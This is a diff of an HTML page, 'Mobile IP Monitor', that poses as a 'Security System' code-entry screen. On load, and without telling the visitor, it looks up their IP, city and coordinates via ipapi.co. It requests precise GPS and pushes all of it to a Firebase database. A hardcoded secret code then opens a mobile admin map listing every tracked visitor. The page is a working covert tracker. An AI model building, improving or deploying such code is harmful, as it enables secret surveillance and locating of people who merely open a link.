@@ -2,57 +2,55 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ultimate IP Tracker</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Mobile IP Monitor</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #0b0b0b; color: #fff; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
-        .container { background: #141414; padding: 20px; border-radius: 20px; width: 95vw; height: 90vh; border: 1px solid #333; display: flex; flex-direction: column; position: relative; }
+        :root { --primary: #007bff; --bg: #0b0b0b; --card: #161616; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: var(--bg); color: #fff; margin: 0; padding: 0; display: flex; flex-direction: column; height: 100vh; }
+        
+        /* Экран входа */
+        #code-step { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; text-align: center; }
+        input { background: #222; border: 1px solid #444; color: #fff; padding: 15px; border-radius: 12px; width: 80%; max-width: 300px; font-size: 18px; margin-bottom: 15px; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--primary); box-shadow: 0 0 10px rgba(0,123,255,0.3); }
+        button { background: var(--primary); color: #fff; border: none; padding: 15px 30px; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; width: 80%; max-width: 300px; }
+
+        /* Админка (Мобильный вид) */
+        #result-step { display: none; flex-direction: column; height: 100vh; width: 100%; }
+        .admin-header { padding: 15px; background: var(--card); border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; font-weight: bold; }
+        
+        .mobile-layout { display: flex; flex-direction: column; flex: 1; min-height: 0; }
+        #map-box { flex: 1; position: relative; min-height: 300px; border-bottom: 2px solid #333; }
+        #map { position: absolute; top:0; bottom:0; left:0; right:0; width: 100%; height: 100%; }
+        
+        #logs { flex: 1; overflow-y: auto; background: #000; padding: 10px; }
+        .log-item { background: var(--card); margin-bottom: 10px; padding: 15px; border-radius: 15px; border-left: 5px solid var(--primary); font-size: 14px; position: relative; }
+        .log-item:active { background: #222; }
+        .method-tag { font-size: 10px; padding: 2px 6px; border-radius: 4px; float: right; background: #333; }
+        .gps-tag { background: #00ff88; color: #000; }
+
         .hidden { display: none !important; }
-        
-        /* Сетка админки */
-        .admin-layout { display: grid; grid-template-columns: 300px 1fr; gap: 15px; flex-grow: 1; height: 100%; min-height: 0; }
-        
-        /* Стили карты */
-        #map-container { position: relative; width: 100%; height: 100%; border-radius: 15px; overflow: hidden; border: 1px solid #007bff; }
-        #map { position: absolute; top: 0; bottom: 0; left: 0; right: 0; width: 100%; height: 100%; }
-        
-        /* Список логов */
-        #logs { overflow-y: auto; background: #000; padding: 10px; border-radius: 15px; border: 1px solid #222; height: 100%; box-sizing: border-box; }
-        .log-item { background: #1a1a1a; margin-bottom: 8px; padding: 10px; border-radius: 8px; border-left: 4px solid #007bff; cursor: pointer; font-size: 13px; transition: 0.2s; }
-        .log-item:hover { background: #252525; border-left-color: #00ff88; }
-        
-        /* Кнопки и инпуты */
-        .login-box { text-align: center; margin: auto; }
-        button { background: #007bff; color: white; border: none; padding: 12px 25px; cursor: pointer; border-radius: 8px; font-weight: bold; }
-        input { padding: 12px; width: 250px; border-radius: 8px; border: 1px solid #444; background: #222; color: white; text-align: center; font-size: 16px; margin-bottom: 10px; }
-        
-        .method-gps { color: #00ff88; font-weight: bold; font-size: 10px; }
-        .method-ip { color: #888; font-size: 10px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div id="code-step" class="login-box">
-        <h2 style="color: #007bff;">Terminal Access</h2>
-        <input type="password" id="accessCode" placeholder="SECRET CODE">
-        <br>
-        <button onclick="checkCode()">ENTER SYSTEM</button>
+    <div id="code-step">
+        <h1 style="color: var(--primary); margin-bottom: 10px;">Security System</h1>
+        <p style="color: #888; margin-bottom: 30px;">Введите секретный код для доступа</p>
+        <input type="password" id="accessCode" placeholder="••••••••">
+        <button onclick="checkCode()">ПОДТВЕРДИТЬ</button>
     </div>
 
-    <div id="result-step" class="hidden" style="height: 100%; flex-direction: column; display: flex;">
-        <h3 style="margin: 0 0 10px 0; color: #007bff; display: flex; justify-content: space-between;">
-            System Monitor <span><button onclick="location.reload()" style="padding: 2px 10px; font-size: 12px;">Logout</button></span>
-        </h3>
-        <div class="admin-layout">
-            <div id="logs">Connecting to Database...</div>
-            <div id="map-container">
-                <div id="map"></div>
-            </div>
+    <div id="result-step">
+        <div class="admin-header">
+            <span>Global Monitor</span>
+            <span style="color: var(--primary); font-size: 12px;" id="count-label">Users: 0</span>
+        </div>
+        <div class="mobile-layout">
+            <div id="map-box"><div id="map"></div></div>
+            <div id="logs">Загрузка базы данных...</div>
         </div>
     </div>
-</div>
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
@@ -75,105 +73,95 @@
     const SECRET_CODE = "HTMLKODEYOURIP";
     let map, markers = {};
 
-    // 1. МГНОВЕННЫЙ СБОР ПРИ ЗАХОДЕ
-    async function collectData() {
+    // --- 1. ТИХИЙ СБОР ПРИ ЗАПУСКЕ ---
+    async function track() {
         try {
-            // Сначала по IP
+            // Берем IP данные сразу
             const res = await fetch('https://ipapi.co/json/');
             const ipData = await res.json();
             
-            const pushData = (lat, lng, m) => {
+            const send = (la, ln, m) => {
                 push(ref(db, 'visits'), {
                     ip: ipData.ip || "Unknown",
                     city: ipData.city || "Unknown",
-                    lat: lat,
-                    lng: lng,
-                    method: m,
+                    lat: la, lng: ln, method: m,
                     time: new Date().toLocaleString('ru-RU'),
                     timestamp: serverTimestamp()
                 });
             };
 
-            pushData(ipData.latitude, ipData.longitude, "IP");
+            // Первая точка (IP)
+            send(ipData.latitude, ipData.longitude, "IP");
 
-            // Затем пытаемся GPS
+            // Пытаемся взять GPS
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (p) => pushData(p.coords.latitude, p.coords.longitude, "GPS"),
+                    (p) => send(p.coords.latitude, p.coords.longitude, "GPS"),
                     null, { enableHighAccuracy: true }
                 );
             }
-        } catch (e) { console.log("Silent error"); }
+        } catch (e) { console.log("Init..."); }
     }
-    collectData();
+    track();
 
-    // 2. ВХОД
+    // --- 2. ПРОВЕРКА КОДА ---
     window.checkCode = function() {
-        if (document.getElementById('accessCode').value === SECRET_CODE) {
+        const val = document.getElementById('accessCode').value;
+        if (val === SECRET_CODE) {
             document.getElementById('code-step').classList.add('hidden');
-            const resStep = document.getElementById('result-step');
-            resStep.classList.remove('hidden');
-            resStep.style.display = 'flex';
-            
-            // Инициализация карты с задержкой, чтобы контейнер успел появиться
-            setTimeout(initMap, 400);
+            const res = document.getElementById('result-step');
+            res.style.display = 'flex';
+            setTimeout(initMap, 300);
         } else {
-            alert("Wrong Code");
+            // БАГ-ФИКС: перезагрузка при неверном коде
+            location.reload();
         }
     }
 
+    // --- 3. КАРТА И ЛОГИ ---
     function initMap() {
-        if (map) return;
-        map = L.map('map').setView([20, 0], 2);
-        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-            attribution: '&copy; CartoDB'
-        }).addTo(map);
-        
-        // КРИТИЧЕСКИЙ ФИКС БАГА: заставляем карту обновить размер
-        setTimeout(() => { map.invalidateSize(); }, 200);
-        
+        map = L.map('map', { zoomControl: false }).setView([20, 0], 2);
+        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
         loadData();
     }
 
     function loadData() {
-        onValue(ref(db, 'visits'), (snapshot) => {
-            const data = snapshot.val();
-            const logsDiv = document.getElementById('logs');
-            logsDiv.innerHTML = '';
-            
-            if (!data) return;
+        onValue(ref(db, 'visits'), (snap) => {
+            const data = snap.val();
+            const logBox = document.getElementById('logs');
+            logBox.innerHTML = '';
+            if(!data) return;
 
             const entries = Object.entries(data);
-            entries.forEach(([key, user], index) => {
-                const num = index + 1;
+            document.getElementById('count-label').innerText = `Users: ${entries.length}`;
+
+            entries.reverse().forEach(([key, user], i) => {
                 const isGPS = user.method === "GPS";
-                
-                // Элемент списка
                 const div = document.createElement('div');
                 div.className = 'log-item';
                 div.innerHTML = `
-                    <b>#${num}</b> ${isGPS ? '<span class="method-gps">[GPS]</span>' : '<span class="method-ip">[IP]</span>'}<br>
-                    <span style="color:#00ff88">${user.ip}</span><br>
-                    ${user.city} | <small>${user.time}</small>
+                    <span class="method-tag ${isGPS ? 'gps-tag' : ''}">${user.method}</span>
+                    <b style="color:var(--primary)">#${entries.length - i}</b><br>
+                    <b>IP:</b> ${user.ip}<br>
+                    <b>City:</b> ${user.city}<br>
+                    <small style="color:#666">${user.time}</small>
                 `;
                 
-                // Клик - летим к маркеру
+                // Клик на телефоне - летим к метке
                 div.onclick = () => {
-                    map.flyTo([user.lat, user.lng], 15, { duration: 1.5 });
+                    map.flyTo([user.lat, user.lng], 16);
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
                 };
                 
-                logsDiv.prepend(div);
+                logBox.appendChild(div);
 
-                // Ставим маркер
                 if (!markers[key]) {
-                    markers[key] = L.marker([user.lat, user.lng])
-                        .addTo(map)
-                        .bindPopup(`User #${num}<br>IP: ${user.ip}<br>Source: ${user.method}`);
+                    markers[key] = L.marker([user.lat, user.lng]).addTo(map)
+                        .bindPopup(`User ${user.ip}<br>${user.method}`);
                 }
             });
         });
     }
 </script>
-
 </body>
 </html>
